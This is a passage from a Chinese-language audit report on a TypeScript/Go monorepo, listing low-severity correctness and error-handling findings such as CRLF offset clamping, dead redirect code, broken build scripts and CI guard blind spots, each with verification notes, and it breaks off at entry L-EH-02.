**失败场景**: 一个 WGSL artifact 从 Windows 粘贴而来,以 CRLF 行尾存储。WebGPU 后端报告 `{ severity: 'error', line: 2, column: 1, length: 80, message: 'unresolved identifier' }`。`lineStart` 是第一个 `\n` 之后的偏移;`from = lineStart`;`to = Math.min(lineEnd, lineStart + 80) = lineEnd`,而该位置是前面紧跟 `\r` 的 `\n`。`isValidOffset(source, to)` 为 false,`createCodeSourceSpanFromOffsets` 返回 null,用户看到的是一条没有行/列信息且 “Open source” 动作被禁用的 COD-5002 错误,而完全相同的 LF artifact 却能正确报告 span。

**修复建议**: 计算 `lineEnd` 时排除末尾的 `\r`(例如 `const lineEnd = nextLine < 0 ? sourceLength : (source[nextLine - 1] === '\r' ? nextLine - 1 : nextLine)`),使被钳制的偏移永远不会落在 `\r` 与 `\n` 之间。

**验证备注**: 机制已验证。shaderCompileCapabilityProvider.ts:69-82 用 `indexOf('\n', lineStart)` 计算 `lineEnd`,因此在 CRLF 上 `source[lineEnd-1] === '\r'`;`from = Math.min(lineEnd, lineStart + column - 1)`(第 75 行)与 `to = Math.min(lineEnd, from + length)`(第 82 行)都可能落在 `lineEnd` 上。packages/authoring/src/language/codeSourceSpan.ts:13-17 的 `isValidOffset` 显式拒绝拆开 CRLF 的偏移,因此 `createCodeSourceSpanFromOffsets` 返回 null,`normalizeMessage`(第 90-96 行)不会展开 `sourceSpan`,`createDiagnostic`(第 126-128 行)发出的 COD-5002 缺少它,随后 `hasRequirement('sourceSpan', ...)`(packages/diagnostics/src/buildDiagnosticPresentation.ts:177-178)禁用 `open-source` 动作。artifact 写入路径上不存在任何 CRLF 规范化——其他地方明确针对 CRLF 源码做了测试(packages/workspace/src/workspaceCodeLanguageEditTransaction.property.test.ts:70、packages/authoring/src/language/codeLanguage.property.test.ts:117),因此这种输入是真实的,而 shaderCompileCapability.property.test.ts 只用 LF 源码覆盖了偏移分支。对该主张的两点更正。所引场景对真实后端是错误的:apps/web/src/editor/codeCompile/browserShaderCompilerBackends.ts:218-237 始终转发 WebGPU 的 `offset`,走的是第 51-67 行的更早分支,而它对 WebGL2 从不发送 `length`。可达的路径是 WebGL2/GLSL 日志解析器(第 7-37 行),它给出行号、有时给出列号,而 length 默认为 1:空 CRLF 行上的错误(`lineEnd === lineStart + 1`),或驱动给出的列号超出最后一个字符一位(`from === lineEnd - 1`),都会产生 `to === lineEnd` 并丢弃 span。影响面窄,只降低诊断导航能力——low 是正确的。真正的缺陷行是第 82 行的 `to` 钳制(第 75 行同样存在该问题)。

##### L-C-20 在符合规范的 fetch 下,Gateway 网络适配器永远无法跟随重定向——重定向分支不可达,maxRedirects 形同虚设

- **位置**: [`packages/plugin-browser/src/gateway/network/gatewayNetworkAdapter.ts:140`](packages/plugin-browser/src/gateway/network/gatewayNetworkAdapter.ts#L140)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-host`

**详情**: 该适配器以 `fetch(..., { redirect: 'manual' })` 发起请求。按照 Fetch 的 HTTP-redirect fetch,`manual` 重定向模式总是产生一个不透明重定向过滤响应(`type === 'opaqueredirect'`、`status === 0`、空 headers)——这是无条件的,并非仅限跨源。`opaqueredirect` 守卫先于 `[301,302,303,307,308].includes(response.status)` 分支运行,因此在使用 `globalThis.fetch` 时,第 150-172 行的重定向跟随循环(以及 `policy.maxRedirects`、`redirectMethod` 和结果字段 `redirected: true`)都是死代码。来自允许列表源的每一个 3xx 都会被报告为策略拒绝。那两个重定向测试之所以能通过,只是因为它们注入了返回未过滤 `Response` 的桩 `fetch`,因此它们断言的是生产中不可能发生的行为。

**失败场景**: 某个作用域策略设置 `maxRedirects: 2` 与 `allowedPathPrefixes: ['/v1']`。插件对 `https://api.example.com/v1/start` 调用 `network/request`;服务端响应 `303 Location: /v1/final`。在真实浏览器中,适配器收到的是 opaqueredirect 响应,于是返回 PLG-4038 'Network redirect location is not visible for policy revalidation.',而不是去请求 `/v1/final` 并返回其 200 响应体。

**修复建议**: 要么去掉 `maxRedirects` 与重定向循环,并明确记录所有重定向都失败关闭;要么改用 `redirect: 'follow'` 加上一个宿主侧代理,由它暴露重定向链以便逐跳重新校验策略。同时更新那两个重定向测试,使其不再断言一条不可达的生产路径。

**验证备注**: 证据与 gatewayNetworkAdapter.ts:131-172 吻合。Fetch 标准的 HTTP fetch 对任何重定向状态都按重定向模式分派:'manual' -> 不透明重定向过滤响应(type 'opaqueredirect'、status 0、空 header 列表)。这是无条件的,并非仅限跨源,因此在浏览器中第 140-149 行的守卫总是先触发,`[301,302,303,307,308]` 分支、`policy.maxRedirects`、`redirectMethod()`(第 30 行)和 `redirected: true` 都不可达。已确认测试只有通过注入返回未过滤 `new Response(null, {status: 302/303, headers:{location}})` 的桩 fetch 才能进入该分支(packages/plugin-browser/src/**tests**/gatewayNetworkAdapter.test.ts:162-224),即真实 `globalThis.fetch` 无法产生的行为。严重级别由 medium 下调为 low:`createGatewayNetworkAdapter` 在仓库中没有任何非测试调用方(`git grep` 只在测试文件和包索引桶文件中找到它),而且 apps/web 从不提供 `network` 服务端口(apps/web/src/editor/pluginGatewayServices.ts 只注册 workspace 与 documents),因此 `network/request` 目前本就返回 GATEWAY_HANDLER_UNAVAILABLE。现实影响是死代码加上一个失效的策略字段,而它产生的行为是保守拒绝,而不是不安全的重定向跟随。

##### L-C-21 审计追加会在 1 秒写入超时内重新扫描整个存储,因此写满一个保留窗口后,敏感的 Gateway 调用开始被拒绝

- **位置**: [`packages/plugin-browser/src/gateway/audit/indexedDbGatewayAuditStore.ts:100`](packages/plugin-browser/src/gateway/audit/indexedDbGatewayAuditStore.ts#L100)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-host`

**详情**: `append()` 在每一次写入时都会对 `by-occurred-at` 打开一个无界游标,并把每一条已存储记录物化进内存中的 `stored` 数组,只为计算保留总量。默认策略保留 5 000 条记录,而每一次 `required-before-effect` 的 Gateway 调用都会执行两次追加(预检 + 结果)。`createGatewaySessionAuditWriter` 把整个追加包裹在 `waitForAuditAppend(..., writeTimeoutMs = 1_000)` 中;当扫描加上事务提交超过该期限时,预检追加会被报告为失败,而 `createBrowserGatewaySessionFactory` 会在 `contract.execute` 之前把它转成一次硬性的 `GATEWAY_AUDIT_UNAVAILABLE` 拒绝。因此随着存储被写满,行为会从“变慢”退化为“功能损坏”。

**失败场景**: 一次长时间的编辑会话为某个 workspace 积累了约 5 000 条审计记录。此后每一次 `document/apply-patch` 都会触发一次预检追加,用游标遍历全部 5 000 行;一旦在较慢设备上超过 1 000 ms,写入器就会拒绝,`appendAudit` 返回一条诊断,`dispatch` 返回 `pluginHostFailure([preflightDiagnostic])`——即使存储本身健康、本可以提交,补丁仍被拒绝。

**修复建议**: 把运行中的 `count`/`totalBytes` 维护在一条小的元数据记录里(或使用 `store.count()` 加上一个有界的最旧优先游标,一旦删除完溢出部分即停止),而不是在每次追加时枚举整个索引。

**验证备注**: 机制是真实的:append()(indexedDbGatewayAuditStore.ts:97-128)打开 `store.index('by-occurred-at').openCursor()`,没有键范围也没有上限,在每一次写入时把每一行都推入 `stored` 并读取完整的 `cursor.value`(对整条嵌套记录做结构化克隆,而不是 `openKeyCursor`),纯粹是为了重新计算那些本可增量维护或用 `count()` 获取的总量。默认值已确认:DEFAULT_GATEWAY_AUDIT_RETENTION_POLICY = {maxRecords: 5_000, maxBytes: 8 MiB}(gatewayAudit.ts:42-46),writeTimeoutMs 默认为 1_000(gatewaySessionAuditWriter.ts:89),而超时对预检/required-before-effect 会被报告为 GATEWAY_AUDIT_UNAVAILABLE,createBrowserGatewaySessionFactory.ts:295-300 又会在 execute 之前把它转为硬性拒绝。每次 required-before-effect 调用两次追加也是对的(预检在 :280,结果在 :341/:360/:387/:425)。严重级别由 medium 下调为 low:所声称的*拒绝*完全取决于无法验证的运行时时序——在特定设备上 5 000 次游标迭代加提交是否超过 1 000 ms——而可以确定的部分只有 O(n) 的写放大(属于性能缺陷,类别应为 efficiency 而非 correctness)。而且它今天也不在任何用户可达的路径上,因为 apps/web 的 WebPluginPlatform 未暴露运行时 `activate`,从而永远不会打开浏览器 Gateway 会话。

##### L-C-22 @prodivix/ui 声明的 react-router peer 范围排除了它实际构建和测试所针对的版本

- **位置**: [`packages/ui/package.json:91`](packages/ui/package.json#L91)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-official-ui`

**详情**: `peerDependencies` 将 `react-router` 锁定为 `"7"`,而 `devDependencies`(第 81 行)和使用方应用(`apps/web/package.json:88`)都使用 `^8.1.0`。`react-router` 位于 Rollup 的 `external` 列表中(`vite.config.ts:16`),因此发布的 `dist` 在运行时确实会导入它,使用方必须自行安装;`PdxLink`/`PdxNav`/`PdxButtonLink` 都从中解析 `Link`。react-router 8 相对 7 是一次主版本升级,因此声明的兼容主版本在事实上是错误的——该包从未针对 react-router 7 构建或测试过。

**失败场景**: 使用方(包括按 `packages/prodivix-compiler/src/export/packageOriginResolver.ts:31` 将 `@prodivix/ui` 列为依赖的编译器导出应用)执行 `npm install @prodivix/ui react-router@8`。npm 会报告 `ERESOLVE could not resolve`,启用 `strict-peer-dependencies` 的 pnpm 则会直接让安装失败,因为 @prodivix/ui 要求 `react-router@7`。如果使用方转而满足所声明的 peer 并安装 react-router 7,`PdxLink` 就会针对一套该包从未编译过的 `Link`/`To` API 进行渲染。

**修复建议**: 将 peer 范围改为与实际使用的版本一致,例如 `"react-router": "^8.1.0"`(只有在该包确实针对两个版本都做过验证时,才使用 `"7 || 8"`)。

**验证备注**: 行号准确:packages/ui/package.json:88-92 是 peerDependencies 块,第 91 行为 `"react-router": "7"`,而第 81 行的 devDependencies 为 `"react-router": "^8.1.0"`,apps/web/package.json:88 也是 `"react-router": "^8.1.0"`。pnpm-lock.yaml:7385 解析到 react-router@8.1.0,因此 8 确实是唯一被安装/构建/测试的版本,而 `"7"` 作为 semver 范围意为 >=7.0.0 <8.0.0——它排除了实际使用的版本。react-router 是真实的运行时表面:vite.config.ts:16 将其外部化,PdxLink.tsx:8 导入 `{ Link, LinkProps, To }`,因此 dist 确实要求使用方安装它。已检查缓解措施:仓库根目录不存在 .npmrc,因此仓库内没有任何东西断言或把关 peer 范围。严重级别由 medium 修正为 low:这仅是已发布包的元数据问题。monorepo 内部不会出现任何破坏(pnpm workspace 链接会忽略该范围,且 apps/web 将 @prodivix/ui 别名指向源码),该包版本为 0.1.2 alpha,故障表现为外部使用方在安装期的 ERESOLVE 警告/错误,而非运行时或数据缺陷。

##### L-C-23 NodeGraph `switch` 执行器在 selector 为 undefined 时选中无 label 的 case,从而绕过 default 分支

- **位置**: [`packages/nodegraph/src/nodeGraphExecutor.ts:86`](packages/nodegraph/src/nodeGraphExecutor.ts#L86)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-domain-misc`

**详情**: `selector` 为 `node.data.value ?? input`;当节点没有配置值且上游节点没有产生输出时(例如没有 `data.value` 的 `start` 节点且 `request.input === undefined`),它就是 `undefined`。case 匹配谓词比较 `candidate.label === selector`;上方的过滤只保证 `candidate.id` 是字符串,因此任何编写时未提供 label 的 case,其 `candidate.label` 都是 `undefined`。`undefined === undefined` 为真,于是第一个无 label 的 case 会匹配上一个本不该匹配的 selector,控制流被路由到 `out.control.case-<id>` 而非 `out.control.default`。`candidate.id === selector` 只有在 id 为字符串时才同样成立,因此 `id` 这一半是安全的;只有可选的 `label` 这一半缺少守卫。

**失败场景**: 在 `request.input` 未设置的情况下执行 `{version:1, nodes:[{id:'s',data:{kind:'start'}},{id:'sw',data:{kind:'switch',cases:[{id:'a'},{id:'b'}]}},...], edges:[s->sw (out.control.next), sw->A (out.control.case-a), sw->B (out.control.default)]}`。`start` 返回 `output: undefined`,因此 `selector === undefined`;`cases[0].label` 是 `undefined`,于是 `selectedCase = {id:'a'}`、`nextHandle = 'out.control.case-a'`。图会运行分支 A,尽管实际上什么都没有匹配;编写的 default 分支 B 变得不可达。现有的一致性夹具(packages/nodegraph/src/**tests**/nodeGraphExecutionProvider.conformance.test.ts:20)只使用 `{id:'selected', label:'selected'}`,因此这条路径没有被测试覆盖。

**修复建议**: 在 label 比较上加守卫,要求 selector 已定义且 label 存在,例如 `const selectedCase = selector === undefined ? undefined : cases.find((c) => c.id === selector || (c.label !== undefined && c.label === selector));`——或者在解码时归一化 cases,使 `label` 始终默认取 id。

**验证备注**: 证据与 nodeGraphExecutor.ts:85-87 完全吻合。:74-84 处的过滤只把 `candidate.id` 收窄为非空字符串;`label` 无类型/可选,因此当某个 case 没有 label 且 `selector` 为 undefined 时,`candidate.label === selector` 即 `undefined === undefined` -> true。`selector = node.data.value ?? input` 在生产中确实会是 undefined:switch 节点只有 `in.data.value` 端口,没有内联值编辑器(SwitchGraphNode.tsx),而 NodeGraphEditorContent.tsx:382 启动执行时不传 `input`,因此 `createNodeGraphExecutionInvocationInput` 省略了 `input`,`start` 返回 `node.data.value ?? input === undefined`。但场景的另一半在第一方编写路径上不可达:每条编辑器写入路径都会打上 label(nodeGraphEditorModel.ts:367-368 `label:'case-1'/'case-2'`,nodeGraphFlowNodes.ts:83 `label: case-N`,graphNodeShared.tsx:267 中的 normalizeCases 会把任何 falsy 的 label 替换为 `case-N`),而 toPersistedNodeData 原样复制 `cases`,因此只有导入的/手写的/AI 生成的文档才可能带有无 label 的 case——nodeGraphCodec.ts 根本不校验 `data.cases`,所以这类文档确实能解码通过。一旦发生,影响是可丢弃的预览执行中走错一个分支,而不是持久化数据损坏。这是真实存在的潜在漏洞,但 high 的严重级别站不住脚;修正为 low。

##### L-C-24 严格的请求体形状校验会接受名为 "" 的未知字段,因为 Array.prototype.find 返回了一个 falsy 的匹配值

- **位置**: [`apps/remote-runner-control-plane/src/httpHandler.ts:204`](apps/remote-runner-control-plane/src/httpHandler.ts#L204)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-cp-hosts`

**详情**: `record()` 是 E3C 边界上每个 JSON 请求体的严格形状闸门——它本应拒绝任何不在 `allowed` 中的键。它通过 `Object.keys(result).find(...)` 来检测,而该方法返回的是*违规键本身*。当违规键是空字符串时,`find` 返回 `''`,这是 falsy 的,因此 `if (unknown || ...)` 守卫不会触发,未知字段被静默接受。这个检查在应该测试是否存在的地方测试了真值性。

**失败场景**: 某个 worker(或任何能带着有效 worker 令牌到达内部监听器的东西)向 `POST /internal/v1/executions/execution-1/transition` 发送请求体 `{"":"smuggled","workerId":"worker-1","leaseToken":"lease-1","status":"succeeded"}`。`Object.keys` 得到 `['', 'workerId', 'leaseToken', 'status']`;`find` 返回 `''`;`'' || required.some(...)` 求值为 false,因此不会抛出 `TypeError`,请求以 HTTP 200 被处理。同样的请求若换成任何其他未知键(例如 `{"x":1, ...}`)会被正确地以 HTTP 400 `invalid-request` 拒绝,因此该边界自身的契约不一致,未知字段拒绝是可被绕过的。

**修复建议**: 改为测试是否存在而非真值性:`if (Object.keys(result).some((key) => !allowed.includes(key)) || required.some((key) => result[key] === undefined)) throw ...`。

**验证备注**: 已核对 httpHandler.ts:204-206:`const unknown = Object.keys(result).find((key) => !allowed.includes(key)); if (unknown || required.some(...))`。`Array.prototype.find` 返回匹配到的元素,因此违规键为 '' 时返回 ''(falsy),守卫不触发——在需要存在性测试(`!== undefined`)的地方做了真值性测试。JSON 允许空字符串键,且 `required` 中从不包含 '',因此第二个析取项也为 false。绕过是真实的。但影响为零:我逐一检查了全部 17 个 `record()` 调用点,每个使用方都按显式名称读取字段(`text(body.workerId)`、`positiveInteger(body.clientSequence)` 等);该文件中没有任何 `...body` 展开,因此被夹带的 '' 键永远不会被转发给 control plane、终端 broker、仓储层或数据库。这些路由也都位于客户端令牌或 worker 令牌认证之后。这是一个潜在的校验器卫生缺陷,症状是契约不一致,而不是可被利用的夹带通道。严重级别由 medium 修正为 low。

##### L-C-25 pnpm build:backend 调用 `make build`,但 apps/backend 没有 Makefile

- **位置**: [`package.json:26`](package.json#L26)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-cli-vscode-scripts`

**详情**: `apps/backend` 中不存在 Makefile(其内容为:.air.toml、Dockerfile、README.md、cmd/、data/、docker-compose.yml、go.mod、go.sum、internal/、server.go、server_test.go)。因此这个根级脚本在任何平台上都不可能成功。`apps/backend` 也没有 package.json,所以 `turbo run build` 同样覆盖不到它——`build:backend` 是构建该 Go 服务唯一有文档的方式,而 CLAUDE.md 把 `pnpm build:backend` 列为常用命令。

**失败场景**: 任何运行 `pnpm build:backend` 的人都会得到 `make: *** No rule to make target 'build'.  Stop.`(在原生 Windows 开发机上则是 `make: command not found`)。文档化的构建命令从未产出过后端二进制文件;唯一可用的构建方式是 Dockerfile 和 `air`。

**修复建议**: 替换为真实的构建调用,例如 `cd apps/backend && go build -o backend ./cmd/server`,或者补上带 `build` 目标的 Makefile。

**验证备注**: package.json:26 逐字为 `"build:backend": "cd apps/backend && make build"`。用 /(Makefile|makefile|GNUmakefile)$/ 过滤 `git ls-files`,在整个仓库中没有任何匹配;apps/backend 的完整非 internal 清单为 .air.toml、Dockerfile、README.md、cmd/server/{.gitkeep,main.go}、docker-compose.yml、go.mod、go.sum、server.go、server_test.go——既没有 Makefile 也没有 package.json,因此 turbo build 也覆盖不到它。该命令在任何平台上都不可能成功,而 CLAUDE.md 把 `pnpm build:backend` 列为常用命令。严重级别由 medium 下调为 low:没有任何 CI 工作流调用 build:backend(对 .github/ 的 grep 零引用),失败是即时且自解释的,并且通过 Dockerfile 和 air 存在可用的构建方式。

##### L-C-26 Tailwind 运行时快照生成器写入的目录并不存在,且从错误的 cwd 读取配置

- **位置**: [`scripts/generate-tailwind-runtime-snapshot.mjs:8`](scripts/generate-tailwind-runtime-snapshot.mjs#L8)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-cli-vscode-scripts`

**详情**: 该脚本以 `apps/web/src/editor/features/design/inspector/components/classProtocol/tailwind.runtime.snapshot.json` 为目标,但仓库中根本没有 `features/design` 目录;生产代码实际消费的快照位于 `apps/web/src/editor/features/blueprint/editor/inspector/components/classProtocol/tailwind.runtime.snapshot.json`。两个已接入的入口点都是坏的:根级 `generate:tailwind-runtime-snapshot`(cwd = 仓库根)在最后的 `fs.writeFile` 处以 ENOENT 失败,而 `apps/web` 的 `tailwind:snapshot`(cwd = apps/web)会把 `configPath` 解析为 `apps/web/apps/web/tailwind.config.ts`,在更早的动态 import 处就死掉。

**失败场景**: 运行 `pnpm generate:tailwind-runtime-snapshot`:设计系统会加载,然后 `fs.writeFile` 以 `ENOENT: no such file or directory, open '.../features/design/inspector/components/classProtocol/tailwind.runtime.snapshot.json'` 拒绝(未处理的 rejection,退出码 1)。运行 `pnpm --filter @prodivix/web tailwind:snapshot`:`await import(pathToFileURL('<repo>/apps/web/apps/web/tailwind.config.ts'))` 抛出 ERR_MODULE_NOT_FOUND。因此 Inspector class protocol 所消费的已提交快照无法通过任何受支持的命令重新生成。

**修复建议**: 改用 `import.meta.url` 而非 `process.cwd()` 解析仓库根,并把 `outputPath` 指向 `apps/web/src/editor/features/blueprint/editor/inspector/components/classProtocol/tailwind.runtime.snapshot.json`。

**验证备注**: 引用证据与 scripts/generate-tailwind-runtime-snapshot.mjs:6-15 吻合。apps/web/src/editor/features/ 下的功能目录为 animation、blueprint、code、component、development、execution、export、issues、newfile、resources、revisionConflict、settings、testing——没有 `design`。唯一提交在库的快照是 apps/web/src/editor/features/blueprint/editor/inspector/components/classProtocol/tailwind.runtime.snapshot.json,由 .../classProtocol/engines/tailwindRuntimeSource.ts:1 导入,因此脚本的路径有两段是错的(design 与 blueprint 之别,以及缺失的 `editor` 段)。我在仓库根执行了根级入口点:它以 `ENOENT: no such file or directory, open 'D:\Projects\prodivix\apps\web\src\editor\features\design\inspector\components\classProtocol\tailwind.runtime.snapshot.json'` 失败,退出码 1。apps/web 的 `tailwind:snapshot` 脚本以 cwd=apps/web 运行,因此 configPath 解析为 apps/web/apps/web/tailwind.config.ts,动态 import 会先行失败。严重级别由 medium 下调为 low:这属于非 CI 的开发者工具(两个脚本名都没有被任何工作流引用),两处失败都很响亮,而且运行时消费的已提交快照不受影响。

##### L-C-27 check-editor-hard-cut 闸门因 pathspec 缺少 :(glob) magic,静默跳过了 apps/web/src 直接子级的每个文件

- **位置**: [`scripts/check-editor-hard-cut.mjs:14`](scripts/check-editor-hard-cut.mjs#L14)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-cli-vscode-scripts`

**详情**: 没有 `:(glob)` magic 时,git pathspec 使用不带 pathname 语义的 wildmatch,此时 `**` 等同于 `*`,其后的字面 `/` 仍然是必需的。因此 `apps/web/src/**/*.ts` 只能匹配至少深一层目录的文件。同类闸门 `scripts/check-property-test-names.mjs:14` 正确使用了 `:(glob)**/*.test.ts`,可见这种差异并非有意为之。已实证验证:`git ls-files --cached --others --exclude-standard 'apps/web/src/**/*.ts' 'apps/web/src/**/*.tsx'` 返回的路径中没有任何一个匹配 `^apps/web/src/[^/]+\.tsx?$`,因此 `apps/web/src/App.tsx`、`apps/web/src/main.tsx` 和 `apps/web/src/vite-env.d.ts` 从未被扫描。该文件中有若干规则并未限定在 `apps/web/src/editor/` 范围内(第 170 行的原始 Atomic Commit 传输规则、第 179 行的 `saveLocalWorkspaceSnapshot`、第 184/190 行的 Outbox 绕过规则,以及全部 `forbiddenPatterns`),因此那些文件完全落在闸门之外。`pnpm run lint`(由 .github/workflows/tests.yml 运行)会调用这个闸门。

**失败场景**: 某次改动在 `apps/web/src/main.tsx` 中加入了 `editorApi.commitWorkspaceOperation(...)` 或一次 `fetch('/workspaces/${id}/operations/commit')` 调用。`pnpm run check:editor-hard-cut` 会打印 "Editor Hard Cut boundaries are valid." 且 CI 通过,尽管该改动绕过了这个闸门本应强制执行的持久 Workspace Outbox。

**修复建议**: 为每个模式加上 `:(glob)` 前缀(与 check-property-test-names.mjs 保持一致),或者去掉这些 glob,改在 JS 中过滤完整的 `git ls-files` 输出。

**验证备注**: 证据与 scripts/check-editor-hard-cut.mjs:10-16 逐字吻合。已在本仓库实证复现:`git ls-files --cached --others --exclude-standard 'apps/web/src/**/*.tsx'` 返回 241 条路径,零条匹配 `^apps/web/src/[^/]+\.tsx$`,而同一 pathspec 加上 `:(glob)` 前缀后返回了 App.tsx、App.test.tsx 和 main.tsx。git 默认的 pathspec 使用不带 WM_PATHNAME 的 wildmatch,因此 `**` 之后的字面 `/` 仍是必需的——apps/web/src 下深度为 0 的文件从未被扫描。同类闸门 scripts/check-property-test-names.mjs:14-15 确实使用了 `:(glob)`,可见这一遗漏并非有意。确有若干规则未限定到 editor/:第 169-177 行(原始 /operations|settings/commit 传输,仅以 `apps/web/src/` 为条件)、178-183(saveLocalWorkspaceSnapshot)、184-196(Outbox/Settings Outbox 绕过),以及第 73-112 行全部会对所有收集到的文件运行的 forbiddenPatterns。根 package.json:90 把 check:editor-hard-cut 接入了 `lint`,而 .github/workflows/tests.yml:41-42 运行 `pnpm run lint`,因此该闸门与 CI 相关。我无法推翻这个缺陷。严重级别下调为 low:后端 pathspec 不受影响(apps/backend/internal/ 直接子级没有 .go 文件),而被遗漏的全部集合只有三个文件——App.tsx、main.tsx、vite-env.d.ts(App.test.tsx 无论如何都被第 25 行的测试过滤器排除)。这是一个狭窄的护栏盲点,而非数据损坏。

##### L-C-28 不可变 PIR wire snapshot 守卫拿工作树与 HEAD 比较,因此已提交的 snapshot 改动总能通过 CI

- **位置**: [`scripts/check-pir-current-boundary.mjs:327`](scripts/check-pir-current-boundary.mjs#L327)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-cli-vscode-scripts`

**详情**: `git diff --name-only HEAD -- specs/pir` 只报告未提交的(已暂存/未暂存)工作树差异。在 CI 检出的环境中工作树是干净的,因此循环体永远不会执行,“不可变 wire snapshot 不得被修改”这条规则形同空操作。此外,只要 git 因任何原因返回非零退出码,整个代码块就会被静默跳过(第 330 行),并且不记录任何 issue。`pnpm run lint` 在 .github/workflows/tests.yml 中运行这道守卫。

**失败场景**: 某个 PR 修改并提交了 `specs/pir/PIR-v1.2.json`(一份已被取代、未激活的 snapshot;activation manifest 固定在 1.6,因此该文件中的其他检查都不会检查 v1.2)。CI 检出该分支后,`git diff --name-only HEAD -- specs/pir` 没有任何输出,`check:pir-current-boundary` 报告 "PIR-current production, package-export, and generated-wire boundaries are valid."。不可变 wire 契约被静默破坏。

**修复建议**: 改为与 merge base / 上游默认分支做 diff(例如 `git diff --name-only origin/main...HEAD -- specs/pir`),而不是与工作树比较;并在 git 调用本身失败时记录 issue,而不是跳过。

**验证备注**: 证据与 scripts/check-pir-current-boundary.mjs:325-330 原样一致。`git diff --name-only HEAD -- specs/pir` 只报告工作树(已暂存+未暂存)相对 HEAD 的差异;在 CI 检出的环境中工作树是干净的,所以 stdout 为空,331-345 行的循环永远不会执行。.github/workflows/tests.yml:22-42 确认执行顺序为 checkout -> pnpm/node setup -> `pnpm install --frozen-lockfile` -> prettier --check -> `pnpm run lint`;在 lint 之前没有任何步骤会弄脏被跟踪的文件,因此这条不可变 snapshot 规则在 CI 中毫无作用。我检查过是否存在补偿性守卫,结论是没有:唯一另一处 snapshot 检查在 262-292 行,它只从 activation manifest 读取 `specs/pir/PIR-v${activatedVersion}.json`,因此被取代的 snapshot(PIR-v1.0/1.1/1.2/1.3/1.4/1.5,全部被跟踪)的内容从未被校验。在 specs/pir 之外执行 `git grep 'PIR-v1\.'` 只找到 packages/shared/scripts/pir-schema.js:98 和 scripts/activate-pir-wire-version.mjs:29,两者都按版本参数化 —— 不存在任何摘要/校验和测试。第 330 行在 git 返回非零状态时静默跳过的问题也确实存在。严重程度下调为 low:这条规则并非完全失效 —— 当开发者在 specs/pir 有未提交改动的情况下运行 `pnpm run lint` 时它仍会触发 —— 而且这是一道纵深防御守卫,它失效本身并不会破坏已持久化的数据。

#### 4.4.2 错误处理(error-handling)

##### L-EH-01 中间请求失败时,IndexedDB 适配器会泄漏未处理的事务 rejection

- **位置**: [`apps/web/src/editor/workspaceSync/indexedDbCausalOutboxStore.ts:127`](apps/web/src/editor/workspaceSync/indexedDbCausalOutboxStore.ts#L127)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-store-sync`

**详情**: `createIndexedDbCausalOutboxStore` 中的每个方法(`enqueue`、`get`、`list`、`claimNext`、`claim`、`update`、`remove`、`replace`)都在开头创建 `completed = transactionComplete(transaction)`,却只在最后才 await 它。如果中间任何一次 `await requestResult(...)` 被 reject,方法会立即 reject,而 `completed`——它会在事务中止时 reject——就没有任何处理器,从而产生 `unhandledrejection`。同样的模式还存在于 `readWorkspaceLocalReplicaPersistenceState`(indexedDbWorkspaceLocalReplicaStore.ts:272)和 `getWorkspaceLocalReplica`(第 246 行)。`saveWorkspaceLocalReplica` 表明作者是知道这个隐患的——它通过 `abortTransaction(transaction, completed)` 处理失败,其中执行了 `completed.catch(() => undefined)`(第 306-316 行)——但这个防护并没有应用到其余九个调用点中的任何一个。

**失败场景**: 在 `update()` 事务进行到一半时触发了 `versionchange`(用户在第二个标签页打开同一应用并触发升级,或存储被回收)。`store.get(entry.id)` 报错,`requestResult` reject,`update` reject 并传播到 `persistFailure`,而从未被 await 的 `completed` 则以中止错误 reject。浏览器会记录一条未处理的 promise rejection,其中的 IndexedDB 中止错误没有任何指向 outbox 的堆栈上下文;在配置为遇未处理 rejection 即失败的 Vitest 运行中,这会非确定性地导致无关测试失败。

**修复建议**: 在创建时就挂上一个空操作的 rejection 处理器(`const completed = transactionComplete(transaction); completed.catch(() => undefined);`,同时保留一个单独的、会被 await 的引用),或者把每个方法体包进 try/finally,像 `saveWorkspaceLocalReplica` 中的 `abortTransaction` 那样 await/catch `completed`。

**验证备注**: 引用与 indexedDbCausalOutboxStore.ts:124-129 相符,且该模式在全部八个方法(enqueue/get/list/claimNext/claim/update/remove/replace)以及 getWorkspaceLocalReplica:246 和 readWorkspaceLocalReplicaPersistenceState:272 中都成立:`completed` 在开头创建,只在末尾 await,因此中间 requestResult 的 rejection 会把它丢弃。transactionComplete 设置了 `transaction.onerror = () => undefined` 但没有调用 preventDefault(),按照 IndexedDB 规范,请求错误仍会继续传播并中止事务,使未被 await 的 `completed` reject,从而产生 unhandledrejection。saveWorkspaceLocalReplica 确实通过 abortTransaction -> completed.catch(() => undefined) 对此做了防护(indexedDbWorkspaceLocalReplicaStore.ts:306-316, 403-405),印证了审查者描述的不对称。但影响仅限于控制台噪音以及可能的测试运行器不稳定:方法自身的 rejection 仍会带着真实错误传播给调用方,没有状态被破坏,且触发条件(连接被强制关闭、存储回收、配额)属于边缘情况。严重度修正为 low。

##### L-EH-02 项目文件保存吞掉 rejection,在只读或提交被拒时不给出任何反馈

- **位置**: [`apps/web/src/editor/features/resources/ProjectFileManager.tsx:293`](apps/web/src/editor/features/resources/ProjectFileManager.tsx#L293)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-resources-issues`

